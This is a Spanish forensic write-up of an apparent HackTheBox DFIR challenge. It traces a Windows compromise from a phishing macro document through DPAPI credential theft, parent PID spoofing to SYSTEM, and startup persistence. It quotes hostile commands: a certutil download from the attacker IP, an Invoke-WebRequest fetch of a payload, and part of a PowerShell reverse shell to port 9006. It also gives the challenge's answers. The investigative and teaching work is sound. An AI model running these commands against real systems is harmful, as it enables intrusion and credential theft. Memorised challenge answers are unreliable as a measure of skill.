---
title: "Sherlock: ShadowBait"
date: 2026-10-27 10:00:00 -0600
categories: [HackTheBox, Sherlocks]
tags: [dfir, windows, phishing, dpapi, powershell, lolbins, parent-pid-spoofing, persistence]
description: Investigación DFIR de un compromiso en Windows que empieza con un documento de phishing y termina en persistencia como SYSTEM.
media_subpath: /assets/img/posts/htb-sherlock-shadowbait
image:
  path: logo.png
  alt: ShadowBait
info:
  platform: HackTheBox
  type: Sherlock
  category: DFIR
  os: Windows
  logo: logo.png
---

{% include writeup-info.html %}

> **Escenario.** Steven, consultor junior en una empresa mediana, descargó un documento
> desde una fuente externa y provocó un posible incidente de seguridad. Un atacante pudo
> haber ganado acceso no autorizado a una máquina Windows, dejando rastros de su actividad.
> La tarea es examinar los artefactos de disco disponibles para identificar comportamiento
> sospechoso y asegurar el sistema.
{: .prompt-info }

> **Cadena del ataque:** documento `.docm` de phishing → `downloader.ps1` (stager) →
> `opendll.exe` (C2 en el puerto 8899) → abuso de DPAPI para robar credenciales de `Samy`
> → `RunasCs.exe` + `Winter2025!` → `psgetsys.ps1` (Parent PID Spoofing a SYSTEM, reverse
> shell en 9006) → persistencia con `document.pdf.exe` y un `.lnk` en Startup.
{: .prompt-tip }

**Herramientas:** DB Browser for SQLite, Timeline Explorer, y análisis de `evtx.csv`
(PowerShell/Operational, Sysmon) y `mft.csv`.

## 1. Documento malicioso del phishing

**Pregunta:** ¿Cuál es el nombre del documento malicioso usado en el phishing que facilitó
el acceso inicial del atacante?

Con **DB Browser for SQLite** abrimos la base de datos del historial de Google Chrome
(`Default\History`) de la cuenta de Steven. En la tabla `downloads` destaca un archivo
llamado `Policy.docm`. Los archivos `.docm` (documentos con macros habilitadas) son un
vehículo clásico para payloads de phishing.

```text
<unidad>\Users\<usuario>\AppData\Local\Google\Chrome\User Data\Default\History
```

![Tabla downloads del historial de Chrome mostrando Policy.docm](01.png)

**Respuesta:** `Policy.docm`

## 2. URL de descarga del documento

**Pregunta:** ¿Cuál fue el enlace completo desde el que se descargó el documento malicioso?

En la misma tabla `downloads`, la columna `tab_url` asociada a `Policy.docm` revela que el
archivo estaba alojado en Google Drive.

![Columna tab_url con la URL de Google Drive](02.png)

**Respuesta** (defanged):

```text
hxxps[://]drive[.]usercontent[.]google[.]com/uc?id=1Y6XAccvtdWvXUGx8WU0qG-7EP781c0uD&export=download
```

## 3. Descarga del stager

**Pregunta:** El documento descargó un script que actuó como *stager* y descargó otro
payload, dando al atacante acceso remoto interactivo. ¿Cuándo se descargó este script?

Cambiamos a **Timeline Explorer** para analizar la Master File Table (`mft.csv`). Filtrando
el *Parent Path* por el directorio de descargas de Steven (`\Users\steven\Downloads`),
identificamos que momentos después del documento se creó un script de PowerShell sospechoso,
`downloader.ps1`.

![MFT en Timeline Explorer mostrando downloader.ps1](03.png)

**Respuesta:** `2025-06-07 05:42:11`

## 4. Payload final de acceso remoto

**Pregunta:** ¿Cuál es la ruta completa del payload final que dio acceso remoto al atacante?

Revisamos los registros de ejecución de PowerShell (`evtx.csv`, canal
`Microsoft-Windows-PowerShell/Operational`) para interceptar los comandos lanzados por
`downloader.ps1`. En un evento `CommandInvocation` se ve que el script usó `Invoke-WebRequest`
para descargar un ejecutable desde la IP del atacante (`http://192.168.204.152/opendll.exe`)
y guardarlo en disco.

![Evento de PowerShell con Invoke-WebRequest de opendll.exe](04.png)

**Respuesta:** `C:\Users\steven\AppData\Roaming\opendll.exe`

## 5. Puerto de C2

**Pregunta:** ¿Qué puerto usó el payload para la comunicación C2?

Filtramos los registros de **Sysmon** (`evtx.csv`, canal `Microsoft-Windows-Sysmon`) por
eventos de red del ejecutable malicioso `opendll.exe`. Vemos una conexión hacia
`192.168.204.152` por el puerto destino `8899`.

![Evento de red de Sysmon hacia el puerto 8899](05.png)
![Detalle de la conexión de opendll.exe](06.png)

**Respuesta:** `8899`

## 6. Archivo abusado vía DPAPI

**Pregunta:** El atacante utilizó un archivo creado y usado por Steven antes del ataque, que
le permitió autenticarse como el usuario "Samy" abusando de DPAPI. ¿Cuál es la ruta completa
de este archivo?

**¿Qué es DPAPI y cómo se abusa?** DPAPI (Data Protection API) es un sistema de cifrado
integrado en Windows que protege datos sensibles a nivel local. Deriva una *Master Key* a
partir de la contraseña de inicio de sesión del usuario. Si el atacante ya ejecuta procesos
bajo la sesión de Steven, el sistema descifra de forma transparente cualquier dato protegido
con DPAPI que le pertenezca.

En el historial de PowerShell (`PSReadline`) vemos la actividad relacionada:

```text
\Users\steven\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
```

![Historial de PowerShell con la creación del objeto de credenciales](07.png)

Los comandos clave que dejó Steven:

```powershell
$credential = New-Object System.Management.Automation.PSCredential($username,$password)
$credential | Export-Clixml -Path "C:\Users\samy\Documents\connection.xml"
```

`Export-Clixml` sobre un objeto `PSCredential` no guarda la contraseña en claro: invoca a
DPAPI y cifra el archivo con la Master Key de la cuenta que ejecuta el comando (Steven).
Como el atacante controlaba la sesión de Steven, solo tuvo que ejecutar el comando inverso.

![PoC del abuso de DPAPI](09.png)

**Respuesta:** `C:\Users\samy\Documents\connection.xml`

## 7. Comando para robar las credenciales de "Samy"

**Pregunta:** ¿Cuál es el comando completo usado para obtener las credenciales de la cuenta
"Samy"?

Al importar el XML desde la sesión autorizada de Steven, DPAPI lo descifra de forma
transparente y entrega las credenciales de Samy listas para usar, sin necesidad de conocer
la contraseña original en texto claro.

![Import-Clixml en el historial de PowerShell](08.png)

**Respuesta:** `$cred = Import-CliXml -Path connection.xml`

## 8. Descarga de la herramienta de movimiento lateral

**Pregunta:** El atacante descargó una herramienta desde su servidor de *staging* para moverse
lateralmente como "Samy". ¿Cuál es el comando completo usado para descargarla?

Buscando en el timeline (`evtx.csv`) el uso del LOLBin `certutil.exe` ejecutado por
`MAIN\steven`, vemos el parámetro `-urlcache -f` para descargar una herramienta desde el C2.
`RunasCs.exe` permite ejecutar comandos con otras credenciales eludiendo ciertas restricciones.

![certutil descargando RunasCs.exe](10.png)

**Respuesta:**

```text
"C:\Windows\system32\certutil.exe" -urlcache -f http://192.168.204.152/RunasCs.exe RunasCs.exe
```

## 9. Contraseña de "Samy"

**Pregunta:** ¿Cuál es la contraseña de la cuenta "Samy" usada por el atacante para obtener
una shell remota?

Para autenticarse con RunasCs, el atacante necesita la contraseña en texto claro (no solo el
objeto protegido). En PowerShell, la salida en pantalla pasa por el cmdlet silencioso
`Out-Default`. Buscando eventos posteriores a la importación del XML, el atributo
`InputObject` revela el contenido que se imprimió en la terminal del atacante.

![Flujo Out-Default con la contraseña en claro](11.png)

**Respuesta:** `Winter2025!`

## 10. Script para comprobar privilegios

**Pregunta:** Tras acceder como Samy, el atacante descargó un script para comprobar los
privilegios de la cuenta. ¿Cuál es el nombre del script?

Filtrando de nuevo por `certutil.exe`, pero esta vez bajo el usuario `MAIN\samy`, vemos la
descarga de `psgetsys.ps1` desde el servidor del atacante.

![certutil descargando psgetsys.ps1 como samy](12.png)

**Respuesta:** `psgetsys.ps1`

## 11. Proceso explotado para elevar privilegios

**Pregunta:** El atacante explotó un proceso de Windows para obtener una shell remota con
privilegios elevados. ¿Cuál es el PID de este proceso?

`psgetsys.ps1` realiza **Parent PID Spoofing**: ejecuta un proceso nuevo que hereda el token
de un proceso legítimo de alto nivel (como SYSTEM), evadiendo detección. Buscando la función
clave `ImpersonateFromParentPid`, vemos primero un intento fallido contra el PID `652`
(*"Process with an Id of 652 is not running"*). La ejecución exitosa posterior usó el PID
correcto con el argumento `-ppid 632`.

![ImpersonateFromParentPid con -ppid 632 y el intento fallido con 652](13.png)
![Error al intentar suplantar el PID 652](14.png)

> Los procesos "hijos" heredan automáticamente los permisos de sus procesos "padres".
{: .prompt-tip }

![Nota sobre herencia de permisos entre procesos](15.png)

**Respuesta:** `632`

## 12. Puerto del acceso con privilegios elevados

**Pregunta:** ¿Qué puerto se usó para el acceso remoto con privilegios elevados?

Al proceso suplantado se le pasa un comando en Base64. Decodificándolo (CyberChef) aparece
una reverse shell de PowerShell que conecta de vuelta al atacante:

![Comando en Base64 pasado a ImpersonateFromParentPid](16.png)
![Base64 decodificado: reverse shell a 192.168.204.152:9006](17.png)

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.204.152",9006); ...
```

**Respuesta:** `9006`

## 13. Backdoor con persistencia

**Pregunta:** El atacante habilitó mecanismos de persistencia para un ejecutable backdoor.
¿Cuál es la ruta completa del archivo?

Filtrando por el campo `ParentCommandLine` con la cadena Base64 de la reverse shell, vemos
toda la actividad dentro de esa sesión SYSTEM. El atacante descargó `document.pdf.exe` y
aseguró su ejecución en cada inicio creando tanto una Tarea Programada (`schtasks.exe`) como
una clave de registro (`reg.exe`).

![Persistencia vía schtasks y reg apuntando a document.pdf.exe](18.png)
![Clave de registro y tarea de persistencia](19.png)

**Respuesta:** `C:\Windows\system32\document.pdf.exe`

## 14. Acceso directo (.lnk) malicioso

**Pregunta:** El atacante también abusó de los accesos directos de Windows y colocó un `.lnk`
apuntando al backdoor. ¿Cuál es el nombre del archivo de acceso directo?

En Sysmon (`evtx.csv`), filtrando el **Event ID 11** ("creación de archivos") bajo
`NT AUTHORITY\SYSTEM`, el campo `TargetFilename` revela el `.lnk` camuflado como un
diagnóstico de red, colocado en la carpeta Startup de Samy.

```text
C:\Users\samy\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NetworkDiagnostics.lnk
```

![Sysmon Event ID 11 creando NetworkDiagnostics.lnk](20.png)

**Respuesta:** `NetworkDiagnostics.lnk`

## 15. Script que creó la persistencia del acceso directo

**Pregunta:** ¿Cuál es la ruta completa del script que creó la persistencia del acceso directo?

Correlacionando los comandos, vemos el uso de `cscript.exe` (Console-based Script Host, un
componente legítimo de Windows para ejecutar VBScript/JScript) para ejecutar un script que
el atacante descargó y colocó en `C:\programdata\`.

![cscript ejecutando wscript.vbs](21.png)

**Respuesta:** `wscript.vbs` (`C:\programdata\wscript.vbs`)

## Indicadores de compromiso (IOCs)

| Tipo | Valor |
| --- | --- |
| IP C2 | `192.168.204.152` |
| Puertos C2 | `8899` (acceso inicial), `9006` (shell SYSTEM) |
| Documento phishing | `Policy.docm` |
| Stager | `downloader.ps1` |
| Backdoors | `opendll.exe`, `document.pdf.exe` |
| Herramientas | `RunasCs.exe`, `psgetsys.ps1`, `wscript.vbs` |
| Credencial expuesta | `connection.xml` (DPAPI) |
| Persistencia | Tarea programada, clave Run, `NetworkDiagnostics.lnk` |

## MITRE ATT&CK (resumen)

| Táctica | Técnica | ID |
| --- | --- | --- |
| Initial Access | Spearphishing Attachment | T1566.001 |
| Execution | PowerShell | T1059.001 |
| Credential Access | Credentials from Password Stores (DPAPI) | T1555 |
| Defense Evasion | Parent PID Spoofing | T1134.004 |
| Command and Control | Ingress Tool Transfer (certutil) | T1105 |
| Persistence | Registry Run Keys / Startup Folder / Scheduled Task | T1547.001 / T1053.005 |

## Lecciones aprendidas

- El historial de Chrome (SQLite) y la MFT bastan para reconstruir el acceso inicial.
- Guardar credenciales con `Export-Clixml` es cómodo, pero si un atacante controla tu sesión,
  DPAPI le descifra el `connection.xml` sin pedir nada.
- `certutil`, `cscript` y el Parent PID Spoofing son LOLBins/técnicas que conviene vigilar con
  Sysmon (Event ID 1, 3 y 11).
